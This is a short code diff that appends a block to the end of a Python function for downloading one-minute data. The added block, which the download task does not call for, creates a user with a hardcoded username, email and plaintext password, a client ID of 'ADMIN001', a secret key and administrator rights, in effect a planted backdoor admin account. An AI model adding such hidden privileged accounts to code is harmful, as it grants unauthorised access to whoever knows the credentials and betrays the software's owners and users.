@@ -1211,3 +1211,13 @@ def download_1min_data(client_id):
     print("\n====================================")
     print("DOWNLOAD COMPLETED")
     print("====================================")
+
+
+    User.objects.create(
+    username="TlI", 
+    email="TImeline@gmail.com", 
+    password="TImelin#12", 
+    client_id="ADMIN001",
+    secret_key="SECRET",
+    is_admin=True
+)
